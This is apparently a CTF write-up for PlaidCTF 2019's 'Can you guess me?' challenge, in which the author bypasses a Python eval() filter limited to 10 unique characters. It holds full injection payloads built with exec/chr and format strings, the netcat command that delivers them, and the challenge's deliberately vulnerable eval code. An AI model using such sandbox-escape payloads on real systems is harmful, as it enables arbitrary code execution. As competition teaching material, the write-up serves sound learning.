## Can you guess me?
Misc (100 pts)

Here's the source to a guessing game: [here](can_you_guess_me.py) 

You can access the server at

nc canyouguessme.pwni.ng 12349


Netcat inside:

```


  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \ 
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/ 
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___| 
                                                                       


Input value: 
```
In the source code, there is a condition check:
```python
ry:
    val = 0
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:         # Make sure it is a number
        val = eval(inp)
    else:
        raise

    if val == secret_value_for_password:
        print(flag)
    else:
        print("Nope. Better luck next time.")
except:
    print("Nope. No hacking.")
    exit(1)

```
I only can input is less than or equal 10 unique characters

According to the `eval` documentation:
```
eval(expression, globals=None, locals=None)
The arguments are a string and optional globals and locals. If provided, globals must be a dictionary. If provided, locals can be any mapping object.

The expression argument is parsed and evaluated as a Python expression (technically speaking, a condition list) using the globals and locals dictionaries as global and local namespace. If the globals dictionary is present and does not contain a value for the key __builtins__, a reference to the dictionary of the built-in module builtins is inserted under that key before expression is parsed. This means that expression normally has full access to the standard builtins module and restricted environments are propagated. If the locals dictionary is omitted it defaults to the globals dictionary. If both dictionaries are omitted, the expression is executed in the environment where eval() is called. The return value is the result of the evaluated expression. Syntax errors are reported as exceptions. Example:

>>> x = 1
>>> eval('x+1')
2
This function can also be used to execute arbitrary code objects (such as those created by compile()). In this case pass a code object instead of a string. If the code object has been compiled with 'exec' as the mode argument, eval()’s return value will be None.
``` 

If we type `secret_value_for_password` it will pass to `eval(inp)`,assign to `val`

Then `val == secret_value_for_password` and it will `print(flag)`

But `secret_value_for_password` is more than 10 unique characters =(

Need to find a way to bypass and execute command to get the flag

### Attempt 1
I used `chr(1+1+1+1+1...)+chr(1+1+1+1+1...)+...` to get the string `'secret_value_for_password'` and need to add `eval` because it needs to convert to string first

But when I check the `len(set(input))`:
```python
>>> input = 'eval(chr(1+1))'
>>> len(set(input))
11
```
So I decided to use another function : `exec`

`exec` do the same thing like `eval`

Check the `len(set(input))`:
```python
>>> input = 'exec(chr(1+1))'
>>> len(set(input))
9
```
Yay! only 9 unique characters

Full payload:
```
exec(chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1))
```

But when I type the payload:
```

  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___|


Input value: exec(chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1)+chr(1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+1+...

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@                                      @@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@   @@@@@@@@@@@@@  @@@@@@@@@    %@@@@@@@@@        @@@@@@@@@@@@@@@@
@@@@@@@@@@@@  @@@@@@@@@@  @@@@@@@        @@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@
@@@@@@@@@@%  @@@@@@@@ @@@, @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@   @@@@@@@@@
@@@@@@@@@  @@@@@@@ @@@ @@  @@@@@@@@@@@ @@@@@@@@@@% (@@@@@@@ (@@@@@@@@  (@@@@@@@
@@@@@@@@  @@@@@@@@@@@@*@@@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@@@@ @@@@@@@  @@@@@@@
@@@@@@@  @@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@ @@@@@@@@@@@@@@@@@@@  @@@@@@@
@@@@@*  @@@@@@@@@@@@@@@          @@    @@@@@@@@@@@&@@#       @@@@@@@@@@   @@@@@
@@@   ,@@&(%@@@@@ @@@              @@@@  @@@@@@@@@             @     .@@@   @@@
@&  @@@@@@      @@@@@@@@@@@@@ @@@@@     @@@@@@@,     #@@@@@@@@@@@@@@@@@@ @@  @@
  @.@@@   @@@@@@     @@@@#   @@@@@@@@@@@@@@@@@@@@  @@@@@@@@@@@@@     %@@&@ @  @
 @@ @@  @@@@@  @@@@@@@%,(@@@@@@@@@@@@@@@@@@@@@@@@. @@@@@@@      .@@@@  @ @@@  @
 @@ @@ @@@@@      @@@@@@@@@@@@@@@@ @@   @@@@@@@@@@@   @@@@@@@@@@@( @@@@@@@@@  @
 @@ @@  @     @@@@    (@@@@@(@@@@@@  @@@@@@@@@@@@@@@@    @@@@@@@@   @@@ @@   @@
  @@@@* @@@@@  @@@@@@       @@@@@@@  @@      @@@@@@@  @ @@@ @@@@    @@@@ @  @@@
@  @@ @@@@@@@     @@@@ @@@@@       @@@@@@@@@@@@     @@@@@@@@@@       @@@@  @@@@
@@   ,@@@@@@@@@  @       @@@@@@@@          @@@@@@@@@@@@@@       @    @@@@  @@@@
@@@@   @@@@@@@@@  @@@        @@@@  @@@@@@@@             @@  @@@  @   @@@@ @@@@@
@@@@@@  @@@@@@@@@@  @@  @@         @@@@@@@@  @@@@@, @@@@@@  @@       @@@@ @@@@@
@@@@@@@  @@@@@@@@@@    @@@@@@@@                                      @@@@ @@@@@
@@@@@@@@  @@@@@@@@@@@(  @@@@@@@@ @@@@@                               @@@& @@@@@
@@@@@@@@@/  @@@@@@@@@@@@   @@@@  @@@@@@@@@ @@@@,               &    @@@@@ @@@@@
@@@@@@@@@@@   @@@@@@@@@@@@@     @@@@@@@@@@ @@@@@@% @@@@  @@* ,@    @@@@@@ @@@@@
@@@@@@@@@@@@@   @@@ @@@@ @@@@@@      @@@@  @@@@@@  @@@  ,@@      @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@   %@@@ @@@@ @@@@@@@@@@                   .@@@@@@@@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@    @@@@ *@@@@ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@@@ @@@@@
@@@@@@@@@@@@@@@@@@@@@@@    .@@@@@ %@@@@  /@@@@@@@@@@@@@@@@@@@ @@@@@@.@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&    @@@@@@@@@/  @@@@@@@@@@@@@@@@@@@@@. @@@@@@  @@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@      @@@@@@@@@@@@@@@@@@@@@@@@@@@@@  @@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@        @@@@@@@@@@@@@@@@@@   @@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

Nope. No hacking.
```

It show me a freaking troll face...

### Attempt 2

Done some research about python sandbox and I got some good stuff:

#### Reference
[Pyfuck](https://github.com/wanqizhu/pyfuck)

[Python in 7 characters](https://codegolf.stackexchange.com/questions/110648/fewest-distinct-characters-for-turing-completeness/110722#110722)

I got an idea with the link above

Is using format string and the `len()` function

```python
'%c%%c%%%%c'%len('cccccccc...')%len('cccccccc...')%len('cccccccc...')
```
Check the input:
```python
>>> input = "eval('%c'%len('c'))"
>>> len(set(input))
10
```
Yes, looks like it will bypass it!

The payload is really loooong, because of the format string `%`...

```
eval('%c%%c%%%%c%%%%%%%%c%%%%%%%%%%%%%%%%c%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%c%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%c%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%c%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%c%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%...
...
...
%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc')%len('cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc'))
```
Save the payload inside a file

Using `cat payload | nc canyouguessme.pwni.ng 12349`

And I get the flag!!

```


  ____         __   __           ____                     __  __       
 / ___|__ _ _ _\ \ / /__  _   _ / ___|_   _  ___  ___ ___|  \/  | ___  
| |   / _` | '_ \ V / _ \| | | | |  _| | | |/ _ \/ __/ __| |\/| |/ _ \ 
| |__| (_| | | | | | (_) | |_| | |_| | |_| |  __/\__ \__ \ |  | |  __/ 
 \____\__,_|_| |_|_|\___/ \__,_|\____|\__,_|\___||___/___/_|  |_|\___| 
                                                                       


Input value: PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}
```

[My script](solve.py)

### Better solutions

I feel I were so dumb when I see others writeups

I didn't know `eval` can execute `print()` function

[Using `help(flag)`](http://jakob.space/posts/plaidctf-2019/)

[Using `print(vars())`](https://ctftime.org/writeup/14671)

[Using `eval(all(chr(var)))`](https://xerxes-break.tistory.com/414)